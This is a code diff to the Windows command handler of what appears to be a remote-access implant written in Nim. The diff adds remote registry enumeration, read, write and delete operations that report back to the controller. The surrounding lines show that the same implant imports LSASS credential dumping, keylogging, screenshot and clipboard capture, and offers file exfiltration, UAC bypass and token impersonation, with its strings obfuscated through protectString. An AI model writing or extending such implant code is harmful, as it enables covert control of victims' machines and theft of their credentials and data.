@@ -2,7 +2,7 @@
 import ../config
 import ../common
 import utils/incl/[evillsasstwin]
-import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv, token]
+import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv, token, reg]
 # External imports
 import std/[tables, nativesockets, json, strutils]
 import wAuto/[registry, window]
@@ -12,7 +12,6 @@ import httpclient
 import threadpool
 import nimprotect
 import strformat
-import strutils
 import osproc
 import crc32
 import net
@@ -26,6 +25,14 @@ proc windows_parse_command*(command: JsonNode): bool
 proc collect_data(): bool
 proc wrap_execute_encoded_powershell(encoded_powershell_command: string, ps_module=""): bool
 proc spawn_wmi(cmdline: string): bool
+proc wrap_regenumkeys(key: string): bool
+proc wrap_regenumvalues(key: string): bool
+proc wrap_regread(key: string, value: string): bool
+proc wrap_regdelete(key: string): bool
+proc wrap_regdelete(key: string, value: string): bool
+proc wrap_regwrite(key: string): bool
+proc wrap_regwrite(key: string, value: string, data: string): bool
+proc wrap_regwrite(key: string, value: string, data: DWORD): bool
 proc checksec(): bool
 proc wrap_get_clipboard(): bool
 proc enum_visible_windows(): bool
@@ -165,6 +172,92 @@ proc spawn_wmi(cmdline: string): bool =
     var is_success = post_data(client, protectString("spawn") , $data)
 
     return is_success
+
+
+proc wrap_regenumkeys(key: string): bool =
+    var subkeys = registry_iterate_keys(key)
+    var data = {
+        protectString("key"): key,
+        protectString("subkeys"): "\n" & subkeys
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regenumkeys") , $data)
+
+  
+proc wrap_regenumvalues(key: string): bool =
+    var values = registry_iterate_values(key)
+    var data = {
+        protectString("key"): key,
+        protectString("values"): "\n" & values
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regenumvalues") , $data)
+
+
+proc wrap_regread(key: string, value: string): bool = 
+    var regdata = registry_read(key, value)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("data"): regdata
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regread") , $data)
+
+
+proc wrap_regdelete(key: string): bool =
+    var is_success = registry_delete(key)
+    var data = {
+        protectString("key"): key,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regdelete") , $data)
+
+
+proc wrap_regdelete(key: string, value: string): bool =
+    var is_success = registry_delete(key, value)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regdelete") , $data)
+
+
+proc wrap_regwrite(key: string): bool =
+    var is_success = registry_write(key)
+    var data = {
+        protectString("key"): key,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regwrite") , $data)
+
+
+proc wrap_regwrite(key: string, value: string, data: string): bool =
+    var is_success = registry_write(key, value, data)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("data"): data,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regwrite") , $data)
+
+
+proc wrap_regwrite(key: string, value: string, data: DWORD): bool = 
+    var is_success = registry_write(key, value, data)
+    var data = {
+        protectString("key"): key,
+        protectString("value"): value,
+        protectString("data"): $data,
+        protectString("is_success"): $is_success
+    }.toOrderedTable()
+    
+    return post_data(client, protectString("regwrite") , $data)
 
 
 proc checksec(): bool =
@@ -670,6 +763,25 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = exfil_file(client, command[protectString("src_file")].getStr())
         of protectString("upload"):
             is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr())            
+        of protectString("regenumkeys"):
+            is_success = wrap_regenumkeys(command[protectString("key")].getStr())
+        of protectString("regenumvalues"):
+            is_success = wrap_regenumvalues(command[protectString("key")].getStr())
+        of protectString("regread"):
+            is_success = wrap_regread(command[protectString("key")].getStr(), command[protectString("value")].getStr())
+        of protectString("regdelete"):
+            if command.contains(protectString("value")):
+                is_success = wrap_regdelete(command[protectString("key")].getStr(), command[protectString("value")].getStr())
+            else:
+                is_success = wrap_regdelete(command[protectString("key")].getStr())
+        of protectString("regwrite"):
+            if command.contains(protectString("value")):
+                if command[protectString("type")].getStr() == "s": # string
+                    is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), command[protectString("data")].getStr())
+                elif command[protectString("type")].getStr() == "d": # dword
+                    is_success = wrap_regwrite(command[protectString("key")].getStr(), command[protectString("value")].getStr(), cast[DWORD](command[protectString("data")].getInt()))
+            else:
+                is_success = wrap_regwrite(command[protectString("key")].getStr())
         of protectString("checksec"):
             is_success = checksec()
         of protectString("clipboard"):
@@ -709,7 +821,7 @@ proc windows_parse_command*(command: JsonNode): bool =
         of protectString("uac-bypass"):
             is_success = uac_bypass(command[protectString("bypass_method")].getStr(), command[protectString("elevated_command")].getStr())
         of protectString("impersonate"):
-            var pid = parseInt(command[protectString("pid")].getStr()) # For some fucking reason .getInt() here gets 0
+            var pid = command[protectString("pid")].getInt()
             is_success = wrap_token_funcs(command_type, pid)
         of protectString("getsys"):
             is_success = wrap_token_funcs(command_type)
